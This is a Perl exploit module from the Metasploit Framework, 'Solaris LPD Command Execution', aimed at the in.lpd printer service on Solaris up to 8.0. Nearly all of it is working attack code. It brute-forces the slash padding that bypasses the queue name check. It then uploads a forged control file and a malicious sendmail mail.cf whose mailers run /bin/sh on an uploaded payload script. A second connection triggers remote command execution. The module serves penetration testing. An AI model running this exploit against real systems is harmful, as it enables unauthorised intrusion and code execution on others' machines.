
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::solaris_lpd_exec;
use base "Msf::Exploit";
use IO::Socket;
use IO::Select;
use strict;
use Pex::Text;

my $advanced = { };

my $info =
{
	'Name'		=> 'Solaris LPD Command Execution',
	'Version'	=> '$Revision$',
	'Authors'	=> [ 'H D Moore <hdm [at] metasploit.com>'],
	'Arch'		=> [ ],
	'OS'		=> [ 'solaris' ],
	'Priv'		=> 1,
	'UserOpts'  => 
	{
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The LPD server port', 515],
		'IPV6'  => [1, 'BOOL', 'The remote side uses IPv6 resolution', 1],
		'SHOST' => [1, 'ADDR', 'The resolved name of the attacking system', '0.0.0.0'],
	},
	
	'Payload' => 
	{
		'Space'    => 8192,
		'Keys'     => ['cmd'],                
	},

	'Description'  => Pex::Text::Freeform(qq{
		This module exploits an arbitrary command execution flaw in the in.lpd
		service shipped with all versions of Sun Solaris up to and including 8.0.
		This module uses the same technique as the 'remorse' exploit written by
		ron1n to bypass the queue name check and pass the -C parameter to the
		mail program. For this exploit to work, you will need to know what your
		IP address is resolved as on the remote system and whether the target
		system is configured for IPv6 name resolution. 

		If no 'SHOST' option is provided (or this value is '0.0.0.0'), then the
		module will automatically use your local IP address as the source host
		value. You will need to set the 'IPV6' option to '0' to exploit systems
		that have not been configured with IPv6 support.
	}),
	
	'Refs'  =>
	[
		['OSVDB', 15131],
		['BID',    3274],
	],
	
	'DefaultTarget' => 0,
	'Targets' => [['No Target Needed']],
	
	'Keys'  => ['lpd'],
};

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Exploit {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_path = $self->GetVar('RPATH');
	my $shellcode   = $self->GetVar('EncodedPayload')->RawPayload;
	my $res;

	my $shost = $self->GetVar('SHOST');
	my $ipv6  = $self->GetVar('IPV6') ? '::ffff:' : '';

	# Try to determine our source address automatically	
	if ($shost eq '0.0.0.0') {
		$shost = Pex::Utils::SourceIP($target_host);
	}

	# This is the temporary path created in the spool directory
	my $spath = "/var/spool/lp/tmp/". $ipv6.$shost;
	

	$self->PrintLine("[*] Determining the required queue name padding length...");
	
	# Determine the number of slashes need to trick the printer name check
	my $slashes = $self->FindSlashes($target_host, $target_port);
	if (! $slashes) {
		$self->PrintLine("[*] Could not determine the number of slashes required");
		return;
	}

	$self->PrintLine("[*] Padding queue name with $slashes slashes :-)");

	# We use one connection to configure the spool directory
	my $s = Msf::Socket::Tcp->new
	(
		'PeerAddr'  => $target_host, 
		'PeerPort'  => $target_port, 
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	);
	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}

	# Send the job request command with the faked printer spool
	$s->Send("\x02". ("/" x $slashes). "metasploit" ."\n");
	$res = $s->Recv(1, 5);
	if (ord($res) != 0) {
		$self->PrintLine("[*] The target did not accept our job request command");
		return;
	}


	# The control file
	my $control = 
		"H"."metasploit\n".
		"P"."\\\"-C".$spath."/mail.cf\\\" nobody\n".
		"f"."dfA187config\n".
		"f"."dfA187script";

	# The mail configuration file
	my $mailcf =
		"V8\n".
		"\n".
		"Ou0\n".
		"Og0\n".
		"OL0\n".
		"Oeq\n".
		"OQX/tmp\n".
		"\n".
		"FX|/bin/sh $spath/script\n".
		"\n".
		"S3\n".
		"S0\n".
		"R\$+     \$#local \$\@blah \$:blah\n".
		"S1\n".
		"S2\n".
		"S4\n".
		"S5\n".
		"\n".
		"Mlocal  P=/bin/sh, J=S, S=0, R=0, A=sh $spath/script\n".
		"Mprog   P=/bin/sh, J=S, S=0, R=0, A=sh $spath/script\n";

	$self->PrintLine("[*] Configuring the spool directory...");
	if ( ! $self->SendFile($s, 2, "cfA187metasploit", $control) ||
		 ! $self->SendFile($s, 3, "mail.cf", $mailcf)        ||
		 ! $self->SendFile($s, 3, "script", $shellcode)
	) { $s->Close; return }

	$s->Send("\x02!\n");
	$s->Close;
	
	$self->PrintLine('');

	# We use another connection to trigger the code execution

	my $t = Msf::Socket::Tcp->new
	(
		'PeerAddr'  => $target_host, 
		'PeerPort'  => $target_port, 
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	);
	if ($t->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $t->GetError);
		return;
	}

	# Send the job request command with the faked printer spool
	$t->Send("\x02". ("/" x $slashes). "metasploit" ."\n");
	$res = $t->Recv(1, 5);
	if (ord($res) != 0) {
		$self->PrintLine("[*] The target did not accept our job request command");
		return;
	}

	$self->PrintLine("[*] Triggering the vulnerable call to the mail program...");
	if ( ! $self->SendFile($t, 2, "cfA187metasploit", $control) ||
		 ! $self->SendFile($t, 3, "dfa187config", $mailcf)        ||
		 ! $self->SendFile($t, 3, "dfa187script", $shellcode)
	) { $t->Close; return }
	
	$t->Close;

	$self->PrintLine("[*] Waiting 60 seconds for the payload to execute...\n");
	sleep(60);

	return;
}

sub FindSlashes {
	my $self = shift;
	my $host = shift;
	my $port = shift;

	for (my $x=1000; $x < 1100; $x++) {
		my $s = Msf::Socket::Tcp->new
		(
			'PeerAddr'  => $host, 
			'PeerPort'  => $port, 
			'LocalPort' => $self->GetVar('CPORT'),
			'SSL'       => $self->GetVar('SSL'),
		);
		if ($s->IsError) {
			$self->PrintLine("[*] Error creating socket ($x): " . $s->GetError);
			return;
		}

		$s->Send("\x02".("/" x $x)."metasploit\n");
		my $r = $s->Recv(1, 5);
		$s->Close;

		return $x if ord($r) == 0;
	}
	
	return;
}

sub SendFile {
	my $self = shift;
	my $sock = shift;
	my $type = shift;
	my $name = shift;
	my $data = shift;    

	$sock->Send(chr($type) .length($data). " $name\n");
	my $res = $sock->Recv(1, 5);
	if (ord($res) != 0) {
		$self->PrintLine("[*] The target did not accept our control file command ($name)");
		return;
	}

	$sock->Send($data);
	$sock->Send("\x00");
	$res = $sock->Recv(1, 5);
	if (ord($res) != 0) {
		$self->PrintLine("[*] The target did not accept our control file data ($name)");
		return;
	}

	$self->PrintLine(sprintf("[*]     Uploaded %.4d bytes >> $name", length($data)));
	return 1;        
}

1;
